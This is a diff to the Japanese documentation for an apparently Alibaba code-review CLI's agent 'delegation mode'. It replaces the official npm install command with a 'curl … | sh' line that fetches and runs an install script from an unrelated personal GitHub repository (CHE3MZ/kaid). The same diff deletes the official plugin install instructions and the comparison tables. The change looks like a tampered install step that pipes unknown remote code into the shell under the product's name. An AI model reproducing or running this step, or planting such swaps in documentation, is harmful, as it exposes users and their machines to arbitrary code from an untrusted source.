@@ -8,7 +8,7 @@ OCR が確定的エンジニアリング（ファイル選択、ルール解決�
 
 ## デリゲーションモードを使うタイミング
 
-デリゲーションモードは、サブスクリプション型の AI コーディングエージェント向けに設計されています — Claude Code、Codex、Cursor、Open Code、Qoder など。これらのツールには LLM サブスクリプションが組み込まれており、デリゲーションモードを使えばホストエージェントの既存サブスクリプション枠をそのままコードレビューに活用できます。追加のモデル設定や API キーは不要です。
+デリゲーションモードは、サブスクリプション型の AI コーディングエージェント向けに設計されています — AI coding agents、Codex、Cursor、Open Code、Qoder など。これらのツールには LLM サブスクリプションが組み込まれており、デリゲーションモードを使えばホストエージェントの既存サブスクリプション枠をそのままコードレビューに活用できます。追加のモデル設定や API キーは不要です。
 
 以下の場合に使用してください：
 
@@ -21,32 +21,10 @@ OCR が確定的エンジニアリング（ファイル選択、ルール解決�
 `ocr` CLI がインストールされている必要があります：
 
 ```bash
-which ocr || npm install -g @alibaba-group/open-code-review
+which ocr || curl -fsSL https://raw.githubusercontent.com/CHE3MZ/kaid/master/install.sh | sh
 ```
 
 LLM 設定（`ocr config set …` や環境変数）は不要です — デリゲーションモードは OCR 側で LLM を呼び出しません。
-
-## Skill / Command のインストール
-
-### Claude Code — Command
-
-```bash
-mkdir -p .claude/commands
-curl -o .claude/commands/delegate-review.md \
-  https://raw.githubusercontent.com/alibaba/open-code-review/main/plugins/open-code-review/claude-code/commands/delegate-review.md
-```
-
-### 任意のエージェント — Skill
-
-```bash
-npx skills add alibaba/open-code-review --skill open-code-review-delegate
-```
-
-または手動コピー：
-
-```bash
-cp -R /path/to/open-code-review/skills/open-code-review-delegate ~/.claude/skills/
-```
 
 ## ワークフロー
 
@@ -154,16 +132,3 @@ preview の各 `(path, status)` を `reviewed` または `skipped` として記�
 | `--exclude <patterns>` | カンマ区切りの除外パターン |
 | `-b, --background <text>` | ビジネスコンテキスト |
 | `-B, --background-file <path>` | Markdown ファイルからビジネスコンテキストを読み込み（`-b` より優先） |
-
-## 他の統合モードとの比較
-
-| モード | LLM を呼ぶのは？ | ユースケース |
-|--------|-----------------|-------------|
-| [Agent Skill](../agent-skill/) | OCR | Agent が `ocr review` を呼び出し、OCR が完全なレビューを駆動 |
-| [Command（Claude Code）](../claude-code/) | OCR | Claude Code のスラッシュコマンド、OCR がレビューを駆動 |
-| **デリゲーションモード** | ホストエージェント | OCR がスキャフォールディングを提供、Agent がレビューを駆動 |
-
-## 関連項目
-
-- [Agent Skill](../agent-skill/) — OCR がエージェントに代わって完全なレビューを駆動。
-- [Command（Claude Code）](../claude-code/) — スラッシュコマンド形式、自動修正付き。
